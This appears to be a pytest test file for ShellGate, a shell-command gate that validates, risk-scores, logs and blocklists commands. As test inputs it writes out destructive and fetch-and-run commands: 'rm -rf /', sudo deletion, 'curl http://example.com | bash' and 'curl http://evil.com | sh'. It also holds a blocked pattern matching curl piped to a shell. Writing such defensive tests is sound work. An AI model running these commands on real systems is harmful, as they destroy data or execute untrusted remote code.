"""
Tests for ShellGate command execution.
"""

import os
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

from cathedral.ShellGate import ShellGate, initialize, is_initialized
from cathedral.ShellGate.models import CommandStatus, ShellConfig, CommandConfig
from cathedral.ShellGate.security import validate_command, check_dangerous_constructs


class TestShellGateInitialization:
    """Tests for ShellGate initialization."""

    def test_initialize_creates_config(self, temp_data_dir):
        """Initialize should create config file if not exists."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")

        result = ShellGate.initialize(config_path, history_path)

        assert result is True
        assert ShellGate.is_initialized() is True
        assert os.path.exists(config_path)

    def test_initialize_loads_existing_config(self, temp_data_dir):
        """Initialize should load existing config file."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")

        # Create existing config
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        import json
        with open(config_path, "w") as f:
            config = ShellConfig()
            config.command_config.default_timeout_seconds = 60
            json.dump(config.to_dict(), f)

        ShellGate.initialize(config_path, history_path)

        loaded_config = ShellGate.get_config()
        assert loaded_config["command_config"]["default_timeout_seconds"] == 60


class TestCommandValidation:
    """Tests for command security validation."""

    def test_validate_allowed_command(self):
        """Should allow basic safe commands."""
        config = CommandConfig()
        is_valid, error = validate_command("ls -la", config)
        assert is_valid is True
        assert error is None

    def test_validate_blocked_command(self):
        """Should block dangerous commands."""
        config = CommandConfig(blocked_commands=["rm -rf"])
        is_valid, error = validate_command("rm -rf /", config)
        assert is_valid is False
        assert error is not None

    def test_validate_command_with_blocked_pattern(self):
        """Should block commands matching blocked patterns."""
        config = CommandConfig(blocked_patterns=[r"curl.*\|.*sh"])
        is_valid, error = validate_command("curl http://evil.com | sh", config)
        assert is_valid is False

    def test_check_dangerous_constructs_pipe_to_shell(self):
        """Should warn about piping to shell."""
        warnings = check_dangerous_constructs("curl http://example.com | bash")
        assert len(warnings) > 0
        assert any("pipe" in w.lower() or "shell" in w.lower() for w in warnings)

    def test_check_dangerous_constructs_sudo(self):
        """Should warn about sudo usage."""
        warnings = check_dangerous_constructs("sudo rm -rf /tmp/test")
        assert len(warnings) > 0
        assert any("sudo" in w.lower() or "privilege" in w.lower() for w in warnings)

    def test_check_dangerous_constructs_safe_command(self):
        """Should not warn about safe commands."""
        warnings = check_dangerous_constructs("ls -la")
        # May still have warnings, but none critical
        assert not any("critical" in w.lower() for w in warnings)


class TestCommandExecution:
    """Tests for command execution."""

    def test_execute_simple_command(self, temp_data_dir):
        """Should execute simple commands successfully."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        # Use a cross-platform command
        if os.name == 'nt':
            result = ShellGate.execute("echo hello")
        else:
            result = ShellGate.execute("echo hello")

        assert result.status == CommandStatus.COMPLETED
        assert "hello" in result.stdout.lower()

    def test_execute_with_timeout(self, temp_data_dir):
        """Should respect timeout parameter."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        # This should complete quickly
        result = ShellGate.execute("echo test", timeout=30)

        assert result.status == CommandStatus.COMPLETED
        assert result.duration_seconds < 30

    def test_execute_captures_stderr(self, temp_data_dir):
        """Should capture stderr output."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        # Command that writes to stderr
        if os.name == 'nt':
            result = ShellGate.execute("echo error 1>&2", timeout=10)
        else:
            result = ShellGate.execute("echo error >&2", timeout=10)

        # stderr should be captured
        assert result.stderr is not None or result.stdout is not None

    def test_execute_nonexistent_command(self, temp_data_dir):
        """Should handle nonexistent commands gracefully."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        result = ShellGate.execute("nonexistent_command_12345")

        assert result.status == CommandStatus.FAILED
        assert result.exit_code != 0


class TestRiskEstimation:
    """Tests for command risk estimation."""

    def test_estimate_risk_safe_command(self, temp_data_dir):
        """Should estimate low risk for safe commands."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        risk = ShellGate.estimate_risk("ls -la")

        assert "risk_level" in risk
        assert risk["is_blocked"] is False

    def test_estimate_risk_dangerous_command(self, temp_data_dir):
        """Should estimate high risk for dangerous commands."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        risk = ShellGate.estimate_risk("rm -rf /")

        assert "warnings" in risk
        assert len(risk["warnings"]) > 0


class TestCommandHistory:
    """Tests for command history."""

    def test_history_records_commands(self, temp_data_dir):
        """Should record executed commands in history."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        ShellGate.execute("echo test1")
        ShellGate.execute("echo test2")

        history = ShellGate.get_history(limit=10)

        assert len(history) >= 2

    def test_clear_history(self, temp_data_dir):
        """Should clear command history."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        ShellGate.execute("echo test")
        count = ShellGate.clear_history()

        assert count >= 1
        assert len(ShellGate.get_history()) == 0


class TestConfigurationUpdate:
    """Tests for configuration updates."""

    def test_update_timeout(self, temp_data_dir):
        """Should update timeout configuration."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        ShellGate.update_config(default_timeout_seconds=120)

        config = ShellGate.get_config()
        assert config["command_config"]["default_timeout_seconds"] == 120

    def test_add_blocked_command(self, temp_data_dir):
        """Should add command to blocklist."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        ShellGate.add_blocked_command("dangerous_cmd")

        config = ShellGate.get_config()
        assert "dangerous_cmd" in config["command_config"]["blocked_commands"]

    def test_remove_blocked_command(self, temp_data_dir):
        """Should remove command from blocklist."""
        config_path = str(temp_data_dir / "config" / "shell.json")
        history_path = str(temp_data_dir / "shell_history" / "history.json")
        ShellGate.initialize(config_path, history_path)

        ShellGate.add_blocked_command("temp_blocked")
        result = ShellGate.remove_blocked_command("temp_blocked")

        assert result is True
        config = ShellGate.get_config()
        assert "temp_blocked" not in config["command_config"]["blocked_commands"]
